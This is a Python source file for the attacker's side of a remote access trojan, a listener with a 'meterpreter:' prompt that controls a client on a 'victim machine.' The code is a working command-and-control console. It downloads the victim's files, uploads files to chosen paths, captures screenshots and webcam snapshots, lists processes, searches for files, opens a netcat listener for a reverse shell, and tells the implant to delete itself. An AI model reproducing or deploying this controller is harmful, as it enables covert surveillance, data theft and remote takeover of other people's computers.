#!/usr/bin/python
from socket import *
import socket
import os
import tkinter as tk
from tkinter import filedialog
import tqdm
import sys
HOST = '0.0.0.0'  
PORT = 1234   
# create socket handler
s = socket.socket()
# bind to interface
s.bind((HOST, PORT))
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
# print we are accepting connections
print("Listening on 0.0.0.0:%s" % str(PORT))
# listen for only 10 connection
s.listen(10)
# accept connections
conn, addr = s.accept()
# print connected by ipaddress
print('Connected by', addr)
# receive initial connection
def download():
     filename = input("Filename: ")
     conn.send(filename.encode())
     data = conn.recv(1024)
     f = open(filename, 'wb')
     while not (b'complete' in data):
          f.write(data)
          data = conn.recv(1024)
     f.write(data)
     f.close()

def upload():
     root = tk.Tk()
     root.withdraw()
     filename = filedialog.askopenfilename()
     filename_2 = os.path.split(filename)[1]
     print(filename_2)
     #filename1 = filename_2.encode('utf-8')
     filesize = os.path.getsize(filename)  
     dest = input('Destination folder on target machine(ex:C:\\Users\\user\\): ')
     dest_actual = dest + filename_2
     conn.send(dest_actual.encode())
     progress = tqdm.tqdm(range(filesize), f"Sending ", unit="B", unit_scale=True, unit_divisor=1024)
     f = open(filename, 'rb')
     i = f.read(1024)    
     while i:
          conn.sendall(i)
          i = f.read(1024)
          progress.update(len(i))
     conn.sendall(i)
     f.close()
     conn.send(b'complete') 

def screenshot():
     #fname = conn.recv(1024)
     #fname1 = fname.decode()
     f = open('screenshot.png', 'wb')
     filedat = conn.recv(1024)
     while not (b'complete' in filedat):
          f.write(filedat)
          filedat = conn.recv(1024)
     f.write(filedat)
     f.close()

def get_ps():
     data = conn.recv(1024)
     while not(b'complete' in data):
          print(data.decode())
          data = conn.recv(1024)

    
def search():
     fltosrch = input('Filename or part of filename: ')
     print('Searching file...')
     try:
          conn.send(fltosrch.encode())
          conn.settimeout(10)
          paths = conn.recv(1024)
          while not(b'complete' in paths):
               print('[+] ', paths.decode())
               conn.settimeout(20)
               paths = conn.recv(1024)
          print('File search complete')
     except socket.timeout:
          print('\nSearch failed...Trying one more time\n')
          paths = conn.recv(1024)
          while not(b'complete' in paths):
               print('[+] ', paths.decode())
               conn.settimeout(20)
               paths = conn.recv(1024)
          pass

def webcam():
     cam_index = input("Webam Index (default is 0): ")
     if '' in cam_index:
          cam_index = str(0)
          conn.send(cam_index.encode())
          pass
     else:
          conn.send(cam_index.encode())
          pass
     f = open('cam_shot.png', 'wb')
     imgdat = conn.recv(1024)
     while not (b'complete' in imgdat):
          f.write(imgdat)
          imgdat = conn.recv(1024)
     f.write(imgdat)
     f.close()     

# start loop
while True:
     command1 = input("meterpreter: ")
     command = command1.encode()
     try:
          conn.send(command)
          if b'quit' in command or b'exit' in command:
               break
          elif b'shell' in command:
               try:
                    os.system('nc -lvp 12345')
               except KeyboardInterrupt:
                    pass
          elif b'download' in command:
               download()
               pass
          elif b'upload' in command:
               upload()
               pass
          elif  b'screenshot' in command:
               screenshot()
               pass
          elif b'ps' in command or b'processes' in command:
               get_ps()
               pass
          elif b'search' in command:
               search()
               pass
          elif b'webcam_snap' in command:
               webcam()
               pass
          elif b'self destruct' in command or b'self delete' in command:
               confirmation = input("Are you sure you want to delete client from victim machine(y/n): ")
               if 'y' in confirmation:
                    conn.sendall(b'y')
                    conn.settimeout(10)
                    del_conform = conn.recv(1024)
                    del_conform = del_conform.decode()
                    if 'del' in del_conform:
                         print('Client terminated and deleted. Exiting...')
                         sys.exit(1)
                    else:
                         pass
               else:
                    pass
     except KeyboardInterrupt:
          pass
     conn.settimeout(10)
     try:
          data1 = conn.recv(65536)
          if data1:
               data = data1.decode()
               print(data)
          else:
               pass
     except:
          pass
conn.close()
